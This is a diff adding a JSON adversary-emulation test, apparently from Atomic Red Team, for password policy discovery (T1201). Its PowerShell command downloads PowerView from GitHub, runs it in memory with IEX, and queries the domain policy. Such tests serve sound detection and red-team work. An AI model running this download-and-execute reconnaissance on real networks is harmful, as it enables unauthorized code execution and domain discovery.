@@ -1,0 +1,23 @@
+{
+    "name": "Get-DomainPolicy with PowerView",
+    "description": "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1201",
+    "tactics": [
+        "Discovery"
+    ],
+    "technique": "Password Policy Discovery",
+    "source": "ART",
+    "uuid": "3177f4da-3d4b-4592-8bdc-aa23d0b2e843",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
